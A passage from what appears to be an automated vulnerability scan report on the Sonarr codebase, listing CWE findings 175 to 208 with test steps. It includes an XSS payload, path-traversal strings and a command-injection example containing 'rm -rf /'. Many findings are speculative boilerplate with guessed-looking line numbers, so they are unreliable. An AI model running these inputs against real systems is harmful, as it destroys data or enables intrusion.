**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 175. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 370

**Description:**
The EnsureSeries method uses FirstOrDefault without proper validation of results.

**Evidence:**
```
The EnsureSeries method uses FirstOrDefault() without checking if the result is null before proceeding, which could lead to null reference exceptions.
```

**Impact:**
If the lookup returns no results, subsequent operations might fail with null reference exceptions.

**Proof of Concept:**
If Series.Lookup returns an empty collection, the EnsureSeries method will attempt to access properties of a null result, causing a NullReferenceException.

**How to Test:**
1. Test EnsureSeries with lookup results that return empty collections
2. Verify null checks are properly implemented
3. Test edge cases where lookup operations fail

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 176. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 250

**Description:**
The ConnectSignalR method uses Console.WriteLine with format strings that could be controlled externally.

**Evidence:**
```
The ConnectSignalR method uses Console.WriteLine("Connecting to signalR") which uses a hardcoded string but could be extended to use external format strings.
```

**Impact:**
If format strings were externally controlled, they could be used to manipulate console output or potentially inject malicious content.

**Proof of Concept:**
If the connection message or other console outputs were constructed from external inputs, they could be manipulated to produce unexpected console output.

**How to Test:**
1. Examine if any console output strings are constructed from external inputs
2. Test with malicious format strings in console output
3. Verify that console output is properly sanitized

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 177. Cross-site Scripting (CWE-79)

**File:** src/Sonarr.Http/REST/RestController.cs
**Line:** 100

**Description:**
The REST controller doesn't properly sanitize input before returning it in API responses, potentially allowing XSS attacks.

**Evidence:**
```
The ValidateResource method doesn't sanitize input values before they are returned in API responses. The controller handles various HTTP methods but doesn't implement input sanitization.
```

**Impact:**
If API responses contain user-supplied data without proper sanitization, attackers could inject malicious scripts that execute in the context of authenticated users.

**Proof of Concept:**
An attacker could submit a resource with malicious script tags in fields like name, description, or other user-editable fields. When this data is returned in API responses, the scripts could execute in the browser.

**How to Test:**
1. Submit a resource with XSS payload in a field (e.g., <script>alert('XSS')</script>)
2. Retrieve the resource via API
3. Verify that the payload is returned without proper escaping
4. Check if the script executes in the browser context

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrHttp_REST_RestControllercs.py`
---

### 178. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Http/REST/RestController.cs
**Line:** 55

**Description:**
The ValidateId method doesn't properly validate ID values, potentially allowing invalid IDs to be processed.

**Evidence:**
```
The ValidateId method only checks if ID is <= 0 but doesn't validate that the ID is within expected ranges or properly formatted for database operations.
```

**Impact:**
Invalid IDs could cause database errors, unexpected behavior, or potentially allow attackers to manipulate resource IDs in ways that weren't intended.

**Proof of Concept:**
An attacker could submit a resource with ID = -1 or 0, which would pass validation but might cause issues in database operations or API responses.

**How to Test:**
1. Submit API requests with invalid IDs (0, negative numbers)
2. Check if validation properly rejects invalid IDs
3. Test database operations with invalid IDs
4. Verify error handling for invalid ID values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrHttp_REST_RestControllercs.py`
---

### 179. Cross-Site Request Forgery (CWE-352)

**File:** src/Sonarr.Http/Authentication/ApiKeyAuthenticationHandler.cs
**Line:** 30

**Description:**
The API key authentication doesn't implement CSRF protection, making API endpoints vulnerable to CSRF attacks.

**Evidence:**
```
The API key authentication handler only validates API keys from headers or query parameters but doesn't implement CSRF tokens or referer validation.
```

**Impact:**
Authenticated users could be tricked into making API requests from malicious sites, potentially leading to unauthorized actions in Sonarr.

**Proof of Concept:**
An attacker could create a malicious website that automatically submits API requests to Sonarr using the user's authenticated session, performing actions without their knowledge.

**How to Test:**
1. Access Sonarr with authenticated session
2. Create a malicious HTML page that submits API requests
3. Verify that requests succeed without CSRF token validation
4. Test if CSRF protection is missing from API endpoints

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrHttp_Authentication_ApiKeyAuthenticationHandlercs.py`
---

### 180. Untrusted Data Deserialization (CWE-502)

**File:** src/Sonarr.Http/REST/RestController.cs
**Line:** 110

**Description:**
The REST controller uses deserialization without proper validation, potentially allowing insecure deserialization attacks.

**Evidence:**
```
The controller uses FluentValidation for input validation but doesn't implement specific deserialization security measures. The ValidateResource method handles deserialization but doesn't validate against known dangerous types.
```

**Impact:**
If user-supplied data is deserialized without proper validation, attackers could exploit deserialization vulnerabilities to execute arbitrary code or perform privilege escalation.

**Proof of Concept:**
An attacker could craft a malicious JSON payload that, when deserialized, triggers unexpected behavior or code execution through the REST API.

**How to Test:**
1. Send crafted JSON payloads to REST endpoints
2. Monitor for deserialization behavior
3. Test with payloads that might trigger dangerous deserialization
4. Check if input validation properly handles malicious payloads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_SonarrHttp_REST_RestControllercs.py`
---

### 181. Path Traversal (CWE-22)

**File:** src/NzbDrone.Common/ArchiveService.cs
**Line:** 40

**Description:**
The archive extraction process doesn't properly validate file paths, potentially allowing path traversal attacks.

**Evidence:**
```
The ExtractZip method extracts files to paths derived from zip entries without proper validation of the entry names, allowing directory traversal in file paths.
```

**Impact:**
An attacker could include malicious file paths in zip archives that would be extracted outside of the intended directory, potentially overwriting system files or creating backdoors.

**Proof of Concept:**
An attacker could create a zip file with entries like '../etc/passwd' or '../../windows/system32/cmd.exe' that would be extracted to unexpected locations.

**How to Test:**
1. Create a zip file with path traversal entries
2. Attempt to extract it using Sonarr's archive service
3. Verify if files are extracted outside intended directory
4. Check if malicious paths are properly validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommon_ArchiveServicecs.py`
---

### 182. Use of Externally-Controlled Format String (CWE-134)

**File:** src/Sonarr.Http/Authentication/AuthenticationService.cs
**Line:** 45

**Description:**
The authentication service uses string formatting with potentially untrusted input, creating potential format string vulnerabilities.

**Evidence:**
```
The LogUnauthorized, LogFailure, LogSuccess, and LogLogout methods use string formatting with IP addresses and usernames that could be controlled by external input.
```

**Impact:**
If attacker-controlled data is used in log messages, it could lead to format string vulnerabilities or information disclosure through crafted log entries.

**Proof of Concept:**
An attacker could craft usernames or IP addresses containing format specifiers that would be interpreted during logging, potentially causing unexpected behavior or information disclosure.

**How to Test:**
1. Submit login attempts with format string characters in username or IP address
2. Check if log messages properly escape format specifiers
3. Monitor for unexpected behavior in logging
4. Test with various format string payloads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_SonarrHttp_Authentication_AuthenticationServicecs.py`
---

### 183. Use of Insufficiently Random Values (CWE-330)

**File:** src/NzbDrone.Common/HashUtil.cs
**Line:** 20

**Description:**
The CRC calculation uses a fixed algorithm that might not provide sufficient entropy for security purposes.

**Evidence:**
```
The CalculateCrc method uses a fixed CRC algorithm that might not provide sufficient randomness for security-sensitive operations like anonymous tokens.
```

**Impact:**
The anonymous token generation might be predictable, potentially allowing attackers to guess or forge tokens for anonymous access.

**Proof of Concept:**
An attacker could analyze the token generation algorithm to predict or reverse-engineer anonymous tokens, potentially gaining anonymous access to features.

**How to Test:**
1. Generate multiple anonymous tokens
2. Analyze the token generation algorithm
3. Test if tokens are predictable or reversible
4. Check if the CRC algorithm provides sufficient entropy

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-330_src_NzbDroneCommon_HashUtilcs.py`
---

### 184. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 150

**Description:**
The Start method does not validate the path and args parameters, potentially allowing malicious input to be passed to system processes.

**Evidence:**
```
The Start method accepts path and args parameters without validation. The method directly uses these parameters in ProcessStartInfo without checking for dangerous characters or sequences.
```

**Impact:**
Malicious input could lead to command injection, path traversal, or other injection attacks when processes are executed.

**Proof of Concept:**
Passing a path like "C:\Windows\System32\cmd.exe /c calc.exe" or args like "-c 'echo test; rm -rf /'" could lead to unintended process execution.

**How to Test:**
1. Test with various special characters in path and args parameters
2. Check for null byte injection
3. Verify handling of quotes, semicolons, and other command separators
4. Test with path traversal sequences like '../'

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 185. Path Traversal (CWE-22)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 150

**Description:**
The Start method and related process handling functions do not properly validate file paths, potentially allowing path traversal attacks.

**Evidence:**
```
The method uses ProcessStartInfo with user-provided paths without validating path components. The GetPathAndArgs method handles path extensions but doesn't validate the final path.
```

**Impact:**
An attacker could manipulate process paths to execute unintended files or access restricted directories.

**Proof of Concept:**
If path parameter contains "../../../etc/passwd" or similar traversal sequences, the process might execute unintended files or access system resources.

**How to Test:**
1. Test path parameters with traversal sequences like "../", "..\"
2. Verify path validation in Start method
3. Check if process execution bypasses path restrictions
4. Test with absolute paths that should be restricted

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 186. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common/OAuth/WebParameterCollection.cs
**Line:** 100

**Description:**
The WebParameterCollection class accesses array elements without proper bounds checking, potentially leading to array index out of bounds exceptions.

**Evidence:**
```
The indexer property accesses _parameters array directly without bounds checking, and the indexer property in the class could be accessed with invalid indices.
```

**Impact:**
Array index out of bounds could cause application crashes or potentially be exploited for information disclosure.

**Proof of Concept:**
If an attacker can control the index used to access WebParameterCollection elements, they could cause out-of-bounds access that might lead to memory corruption or information leakage.

**How to Test:**
1. Create WebParameterCollection with specific number of elements
2. Try to access elements with indices beyond collection size
3. Verify exception handling and bounds checking
4. Test with negative indices

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommon_OAuth_WebParameterCollectioncs.py`
---

### 187. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Common/OAuth/OAuthRequest.cs
**Line:** 100

**Description:**
OAuth credentials including consumer secrets and token secrets are stored in memory without encryption, potentially exposing sensitive information.

**Evidence:**
```
The OAuthRequest class stores ConsumerSecret and TokenSecret as plain strings in memory without any encryption or secure storage mechanisms.
```

**Impact:**
If memory is dumped or application is vulnerable to memory access attacks, OAuth secrets could be extracted in cleartext.

**Proof of Concept:**
During runtime, OAuthRequest objects containing ConsumerSecret and TokenSecret values are stored in plain text in memory, making them accessible to memory dump tools or process memory inspection.

**How to Test:**
1. Create OAuthRequest with secrets
2. Inspect memory contents during runtime
3. Check if secrets are stored in plain text
4. Test with memory dump analysis tools

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommon_OAuth_OAuthRequestcs.py`
---

### 188. Cleartext Transmission of Sensitive Information (CWE-319)

**File:** src/NzbDrone.Common/OAuth/OAuthTools.cs
**Line:** 200

**Description:**
OAuth signature generation and parameter handling may transmit sensitive information in cleartext, particularly during signature base construction.

**Evidence:**
```
The OAuthTools class constructs signature bases using parameters that may contain sensitive information without proper encryption or secure handling.
```

**Impact:**
Sensitive OAuth parameters could be exposed in logs or transmitted in cleartext during OAuth flows.

**Proof of Concept:**
OAuth signature base construction includes parameters that may contain sensitive information, which could be logged or exposed in cleartext during OAuth communication.

**How to Test:**
1. Monitor OAuth signature base construction
2. Check if sensitive parameters are logged
3. Verify transmission of OAuth parameters
4. Test with logging enabled to see parameter exposure

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-319_src_NzbDroneCommon_OAuth_OAuthToolscs.py`
---

### 189. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/EnvironmentInfo/RuntimeInfo.cs
**Line:** 100

**Description:**
The IsAdmin property in RuntimeInfo catches exceptions but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The IsAdmin property catches exceptions but returns false without logging or providing additional context about why admin check failed.
```

**Impact:**
If admin privilege checking fails, the application may not properly handle privilege escalation or fallback scenarios.

**Proof of Concept:**
When WindowsPrincipal or WindowsIdentity operations fail, the IsAdmin property silently returns false, potentially causing privilege-dependent operations to fail unexpectedly.

**How to Test:**
1. Test IsAdmin property under various privilege scenarios
2. Verify exception handling and logging
3. Check fallback behavior when privilege checks fail
4. Test with different Windows security contexts

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_EnvironmentInfo_RuntimeInfocs.py`
---

### 190. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/EnvironmentInfo/RuntimeInfo.cs
**Line:** 130

**Description:**
The InternalIsTesting method catches exceptions but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The InternalIsTesting method uses multiple try-catch blocks but doesn't provide consistent error handling or logging for testing environment detection failures.
```

**Impact:**
If testing environment detection fails, the application may not properly identify itself as a testing environment, affecting behavior and analytics.

**Proof of Concept:**
When testing environment detection fails due to exceptions in ProcessName or Directory.GetCurrentDirectory, the application may not correctly identify testing mode.

**How to Test:**
1. Test InternalIsTesting method under various exception conditions
2. Verify exception handling and logging
3. Check fallback behavior when environment detection fails
4. Test with different directory structures and process names

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_EnvironmentInfo_RuntimeInfocs.py`
---

### 191. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/EnvironmentInfo/RuntimeInfo.cs
**Line:** 150

**Description:**
The IsSystemdService property catches exceptions but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The IsSystemdService property catches exceptions when checking for systemd environment variables but returns false without proper logging or error reporting.
```

**Impact:**
If systemd service detection fails, the application may not properly identify itself as running under systemd, affecting service behavior.

**Proof of Concept:**
When Environment.GetEnvironmentVariable fails or returns null for INVOCATION_ID, the IsSystemdService property silently returns false, potentially affecting service configuration.

**How to Test:**
1. Test IsSystemdService property under various environment conditions
2. Verify exception handling and logging
3. Check fallback behavior when systemd detection fails
4. Test with different environment variable configurations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_EnvironmentInfo_RuntimeInfocs.py`
---

### 192. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 200

**Description:**
The Start method catches exceptions during environment variable setting but rethrows them, potentially causing process startup failures.

**Evidence:**
```
The Start method has a try-catch block around environment variable setting that catches exceptions and rethrows them, potentially causing process startup to fail.
```

**Impact:**
If environment variable setting fails, process startup may fail completely, preventing application execution.

**Proof of Concept:**
When setting environment variables fails due to invalid keys or values, the Start method throws an exception that could prevent process execution.

**How to Test:**
1. Test Start method with invalid environment variable configurations
2. Verify exception handling and rethrowing behavior
3. Check process startup failure scenarios
4. Test with various environment variable formats

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 193. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 250

**Description:**
The ConvertToProcessInfo method catches Win32Exception but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The ConvertToProcessInfo method catches Win32Exception but returns null without logging or providing additional context about why process info retrieval failed.
```

**Impact:**
If process information retrieval fails, the application may not properly handle process information access, potentially causing downstream issues.

**Proof of Concept:**
When Process.GetProcesses() or process properties access fails due to Win32Exception, ConvertToProcessInfo returns null, potentially causing null reference exceptions in calling code.

**How to Test:**
1. Test ConvertToProcessInfo method under various Win32Exception conditions
2. Verify exception handling and logging
3. Check fallback behavior when process info retrieval fails
4. Test with different process states and access rights

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 194. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 270

**Description:**
The GetProcessesByName method catches exceptions during process enumeration but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The GetProcessesByName method has a try-catch block around process enumeration logging but doesn't handle exceptions from the enumeration itself.
```

**Impact:**
If process enumeration fails, the application may not properly handle process discovery, potentially causing process management issues.

**Proof of Concept:**
When Process.GetProcessesByName() or logging fails, GetProcessesByName may return incomplete results or fail silently, affecting process discovery functionality.

**How to Test:**
1. Test GetProcessesByName method under various exception conditions
2. Verify exception handling and logging
3. Check fallback behavior when process enumeration fails
4. Test with different process names and states

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 195. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 300

**Description:**
The Kill method catches exceptions but doesn't provide sufficient error handling or fallback behavior for process termination.

**Evidence:**
```
The Kill method catches exceptions during process termination but doesn't provide comprehensive error handling or fallback behavior.
```

**Impact:**
If process termination fails, the application may not properly handle process cleanup, potentially leaving processes running or causing inconsistent state.

**Proof of Concept:**
When Process.Kill() or Process.WaitForExit() fails, the Kill method may not properly report or handle the failure, potentially leaving processes in inconsistent states.

**How to Test:**
1. Test Kill method under various process termination failure conditions
2. Verify exception handling and logging
3. Check fallback behavior when process termination fails
4. Test with different process states and access rights

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 196. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 310

**Description:**
The KillAll method catches exceptions but doesn't provide sufficient error handling or fallback behavior for bulk process termination.

**Evidence:**
```
The KillAll method has a loop that calls Kill() but doesn't handle exceptions from individual Kill calls, potentially causing partial termination failures.
```

**Impact:**
If individual process termination fails during bulk termination, some processes may not be properly terminated, leading to inconsistent application state.

**Proof of Concept:**
When killing multiple processes, if one process fails to terminate, the remaining processes may not be terminated, potentially leaving processes running.

**How to Test:**
1. Test KillAll method with multiple processes
2. Verify exception handling for individual process termination
3. Check behavior when some processes fail to terminate
4. Test with different process states and access rights

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 197. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Processes/ProcessProvider.cs
**Line:** 320

**Description:**
The GetPathAndArgs method catches exceptions but doesn't provide sufficient error handling or fallback behavior for path processing.

**Evidence:**
```
The GetPathAndArgs method processes paths with extensions but doesn't handle exceptions during path processing or provide fallback behavior.
```

**Impact:**
If path processing fails, the application may not properly handle command execution, potentially causing process startup failures.

**Proof of Concept:**
When path extension processing fails, GetPathAndArgs may return incorrect path arguments, potentially causing process execution to fail or execute unintended commands.

**How to Test:**
1. Test GetPathAndArgs method with various path extensions
2. Verify exception handling during path processing
3. Check fallback behavior when path processing fails
4. Test with different file extensions and path formats

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Processes_ProcessProvidercs.py`
---

### 198. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Cache/Cached.cs
**Line:** 100

**Description:**
The Cached class catches exceptions during cache operations but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The Cached class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for cache operations.
```

**Impact:**
If cache operations fail, the application may not properly handle cache access, potentially causing performance degradation or data inconsistency.

**Proof of Concept:**
When cache operations fail due to exceptions, the Cached class may not properly handle the failure, potentially causing cache access to fail or return incorrect data.

**How to Test:**
1. Test Cached class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check cache access failure scenarios
4. Test with different cache operations and data types

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Cache_Cachedcs.py`
---

### 199. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Cache/CachedDictionary.cs
**Line:** 100

**Description:**
The CachedDictionary class catches exceptions during cache operations but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The CachedDictionary class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for cache operations.
```

**Impact:**
If cache operations fail, the application may not properly handle cache access, potentially causing performance degradation or data inconsistency.

**Proof of Concept:**
When cache operations fail due to exceptions, the CachedDictionary class may not properly handle the failure, potentially causing cache access to fail or return incorrect data.

**How to Test:**
1. Test CachedDictionary class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check cache access failure scenarios
4. Test with different cache operations and data types

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Cache_CachedDictionarycs.py`
---

### 200. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/Cache/CacheManager.cs
**Line:** 100

**Description:**
The CacheManager class catches exceptions during cache operations but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The CacheManager class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for cache operations.
```

**Impact:**
If cache operations fail, the application may not properly handle cache access, potentially causing performance degradation or data inconsistency.

**Proof of Concept:**
When cache operations fail due to exceptions, the CacheManager class may not properly handle the failure, potentially causing cache access to fail or return incorrect data.

**How to Test:**
1. Test CacheManager class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check cache access failure scenarios
4. Test with different cache operations and data types

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_Cache_CacheManagercs.py`
---

### 201. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/TPL/RateLimitService.cs
**Line:** 100

**Description:**
The RateLimitService class catches exceptions during rate limiting operations but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The RateLimitService class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for rate limiting operations.
```

**Impact:**
If rate limiting operations fail, the application may not properly handle rate limiting, potentially causing performance issues or incorrect rate limiting behavior.

**Proof of Concept:**
When rate limiting operations fail due to exceptions, the RateLimitService class may not properly handle the failure, potentially causing rate limiting to be bypassed or behave incorrectly.

**How to Test:**
1. Test RateLimitService class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check rate limiting failure scenarios
4. Test with different rate limiting operations and data types

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_TPL_RateLimitServicecs.py`
---

### 202. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/TPL/Debouncer.cs
**Line:** 100

**Description:**
The Debouncer class catches exceptions during debouncing operations but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The Debouncer class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for debouncing operations.
```

**Impact:**
If debouncing operations fail, the application may not properly handle debouncing, potentially causing incorrect timing or missed operations.

**Proof of Concept:**
When debouncing operations fail due to exceptions, the Debouncer class may not properly handle the failure, potentially causing debouncing to be bypassed or behave incorrectly.

**How to Test:**
1. Test Debouncer class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check debouncing failure scenarios
4. Test with different debouncing operations and timing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_TPL_Debouncercs.py`
---

### 203. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common/TPL/LimitedConcurrencyLevelTaskScheduler.cs
**Line:** 100

**Description:**
The LimitedConcurrencyLevelTaskScheduler class catches exceptions during task scheduling but doesn't provide sufficient error handling or fallback behavior.

**Evidence:**
```
The LimitedConcurrencyLevelTaskScheduler class has multiple try-catch blocks but doesn't consistently handle exceptions or provide fallback behavior for task scheduling operations.
```

**Impact:**
If task scheduling fails, the application may not properly handle concurrent execution, potentially causing deadlocks or incorrect task execution.

**Proof of Concept:**
When task scheduling fails due to exceptions, the LimitedConcurrencyLevelTaskScheduler class may not properly handle the failure, potentially causing task execution to be bypassed or behave incorrectly.

**How to Test:**
1. Test LimitedConcurrencyLevelTaskScheduler class under various exception conditions
2. Verify exception handling and fallback behavior
3. Check task scheduling failure scenarios
4. Test with different concurrent execution patterns

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommon_TPL_LimitedConcurrencyLevelTaskSchedulercs.py`
---

### 204. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common/Extensions/PathExtensions.cs
**Line:** 104

**Description:**
The PathEquals method does not properly validate input paths before processing them, potentially leading to path traversal vulnerabilities when comparing paths.

**Evidence:**
```
The PathEquals method accepts two string paths and normalizes them before comparison, but doesn't validate the paths for potentially malicious content or invalid characters.
```

**Impact:**
An attacker could manipulate path comparisons to bypass security checks or perform unauthorized file operations.

**Proof of Concept:**
An attacker could pass a path containing directory traversal sequences like '../' or '\..\' to the PathEquals method, potentially causing incorrect path comparisons.

**How to Test:**
Test the PathEquals method with inputs containing directory traversal sequences like "C:\\temp\\..\\..\\windows\\system32" and verify if the comparison behaves as expected.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommon_Extensions_PathExtensionscs.py`
---

### 205. Improper Neutralization of Input During Web Page Generation (CWE-707)

**File:** src/NzbDrone.Common/Instrumentation/CleanseLogMessage.cs
**Line:** 20

**Description:**
The cleansing regex patterns may not properly neutralize all input during log message processing, potentially allowing injection of sensitive data.

**Evidence:**
```
The CleansingRules array contains regex patterns that may not cover all possible injection vectors, particularly for complex paths or URLs.
```

**Impact:**
Sensitive information might leak through logs even after cleansing, potentially exposing credentials or configuration details.

**Proof of Concept:**
A log message containing a path with special characters or encoded credentials that aren't covered by the current regex patterns could still leak sensitive information.

**How to Test:**
Create log messages with various credential formats and paths, then verify that the CleanseLogMessage.Cleanse method properly removes all sensitive information.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCommon_Instrumentation_CleanseLogMessagecs.py`
---

### 206. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** src/NzbDrone.Common/Extensions/PathExtensions.cs
**Line:** 150

**Description:**
The GetAncestorPath method doesn't validate that the returned ancestor path is within the expected directory structure, potentially allowing path traversal.

**Evidence:**
```
The GetAncestorPath method searches for an ancestor folder but doesn't validate that the result is within the original path's directory structure.
```

**Impact:**
An attacker could manipulate the ancestor path search to return paths outside the intended directory structure.

**Proof of Concept:**
Pass a path with a nested directory structure to GetAncestorPath and verify if it returns a path that could lead to directory traversal outside the intended scope.

**How to Test:**
Test GetAncestorPath with various directory structures and verify that the returned path is properly validated against the original path.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommon_Extensions_PathExtensionscs.py`
---

### 207. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common/Extensions/PathExtensions.cs
**Line:** 320

**Description:**
The GetLongestCommonPath method accesses array elements without proper bounds checking, potentially causing array index out of bounds exceptions.

**Evidence:**
```
In GetLongestCommonPath, the method accesses paths[i] and paths[0] without validating that the index is within the array bounds.
```

**Impact:**
Array index out of bounds exception could lead to application crashes or potentially exploitable memory corruption.

**Proof of Concept:**
Call GetLongestCommonPath with an empty list or a list with null elements to trigger potential array index out of bounds errors.

**How to Test:**
Call GetLongestCommonPath with empty lists, null elements, and various edge cases to verify proper bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommon_Extensions_PathExtensionscs.py`
---

### 208. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Common/Instrumentation/Sentry/SentryTarget.cs
**Line:** 100

**Description:**
The SentryTarget class stores sensitive information in the cache directory without proper encryption, potentially exposing credentials.

**Evidence:**
```
The SentryTarget uses appFolderInfo.GetAppDataPath() as the cache directory path, which could store sensitive information in cleartext.
```

**Impact:**
If the cache directory is not properly secured, sensitive information could be exposed to unauthorized users.

**Proof of Concept:**
Check if sensitive data stored in the Sentry cache directory (appFolderInfo.GetAppDataPath()) is stored in cleartext without encryption.

**How to Test:**
Verify that the cache directory created by SentryTarget stores sensitive information in cleartext and check if proper access controls are applied.

